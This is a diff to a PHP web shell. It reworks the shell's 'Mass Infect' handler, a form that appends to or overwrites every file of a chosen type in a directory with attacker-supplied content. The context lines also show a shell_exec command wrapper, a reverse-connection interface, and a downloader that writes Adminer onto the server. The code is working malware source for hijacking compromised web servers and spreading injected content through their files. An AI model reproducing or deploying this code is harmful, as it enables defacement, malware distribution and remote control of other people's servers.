@@ -189,55 +189,6 @@ $file=file_get_contents('https://www.adminer.org/static/download/4.2.4/adminer-4
 fwrite($nama, $file);
 fclose($nama);
 }
-elseif(isset($_REQUEST['massinfect']) && isset($_REQUEST['path'])) {
-	chdir($_GET['path']);
-    global $sep;
-    $mode=$_POST['modexxx'];
-    $ftype=$_POST['ffttype'];
-    $c_cont=$_POST['code_cont'];
-    $ppp=$_POST['path'];
-    if(isset($_POST['modexxx']) && isset($_POST['path']) && isset($_POST['ffttype']) && isset($_POST['code_cont']) && $mode!="" && $ftype!="" && $c_cont!="" && $ppp!="") {
-        echo "<center><h2>Mass Infect Successfully</h2></center><table>";
-        switch($mode) {
-            case "Apender":
-                $mmode="a";
-                break;
-            case "Rewrite":
-                $mmode="w";
-                break;
-        }if($handle = opendir($ppp)) {
-            while(($c_file = readdir($handle)) !== False) {
-                if((preg_match("/$ftype".'$'.'/', $c_file , $matches) != 0) && (preg_match('/'.$c_file.'$/', $self , $matches) != 1)) {
-                    echo "<tr><td><font
-color=red>$ppp$sep$c_file</font></td></tr>";
-                    $fd = fopen($ppp.$sep.$c_file,$mmode);
-                    if($fd) {
-                        fwrite($fd,$c_cont);
-                    }else {
-                        alert("Error. Access Denied");
-                    }
-                }
-            }
-        }
-        echo "</table><br><br><hr><br><br></div>";
-    }else {
-    ?>
-<center><h2>Mass Infect</h2></center><hr><br><br><table><form method='POST'>
-<input type='hidden' name='path' value="<?php echo getcwd();
-?>"><tr><td>Mode : </td>
-<td><select name='modexxx'>
-<option>Rewrite</option>
-<option>Apender</option>
-</select></td></tr>
-<tr><td>File Type</td><td>
-<input name='ffttype' value='html' size=50></td></tr>
-<tr><td>Content : </td>
-<td><textarea name='code_cont' style='width:383px;height:400px'></textarea></td></tr>
-<tr><td></td>
-<td><input type=submit value='Go' /></td></tr></form></table><br><br><hr><br><br>
-    <?php
-    }
-}
 elseif(isset($_REQUEST['rs'])) {
     reverse_conn_ui();
 }
@@ -273,6 +224,54 @@ function exe($cmd) {
 		$buff = @shell_exec($cmd); 		
 		return $buff; 	
 	} 
+}
+if(isset($_REQUEST['massinfect']) && isset($_REQUEST['path'])) {
+	chdir($_GET['path']);
+    global $sep;
+    $mode=$_POST['modexxx'];
+    $ftype=$_POST['ffttype'];
+    $c_cont=$_POST['code_cont'];
+    $ppp=$_POST['path'];
+    if(isset($_POST['modexxx']) && isset($_POST['path']) && isset($_POST['ffttype']) && isset($_POST['code_cont']) && $mode!="" && $ftype!="" && $c_cont!="" && $ppp!="") {
+        echo "<center><h2>Mass Infect Successfully</h2></center><table>";
+        switch($mode) {
+            case "Apender":
+                $mmode="a";
+                break;
+            case "Rewrite":
+                $mmode="w";
+                break;
+        }if($handle = opendir($ppp)) {
+            while(($c_file = readdir($handle)) !== False) {
+                if((preg_match("/$ftype".'$'.'/', $c_file , $matches) != 0) && (preg_match('/'.$c_file.'$/', $self , $matches) != 1)) {
+                    echo "<tr><td><font
+color=red>$ppp$sep$c_file</font></td></tr>";
+                    $fd = fopen($ppp.$sep.$c_file,$mmode);
+                    if($fd) {
+                        fwrite($fd,$c_cont);
+                    }else {
+                        echo "<script>alert('Error. Access Denied');</script>";
+                    }
+                }
+            }
+        }
+        echo "</table><br><br><hr><br><br></div>";
+    }else {
+    ?>
+<center><h2>Mass Infect</h2></center><hr><br><br><table><form method='POST'>
+<input type='hidden' name='path' value="<?php echo getcwd(); ?>"><tr><td>Mode : </td>
+<td><select name='modexxx'>
+<option>Rewrite</option>
+<option>Apender</option>
+</select></td></tr>
+<tr><td>File Type</td><td>
+<input name='ffttype' value='html' size=50></td></tr>
+<tr><td>Content : </td>
+<td><textarea name='code_cont' style='width:383px;height:400px'></textarea></td></tr>
+<tr><td></td>
+<td><input type=submit value='Go' /></td></tr></form></table><br><br><hr><br><br>
+    <?php
+    }
 }
 function reverse_conn_ui() {
 echo "
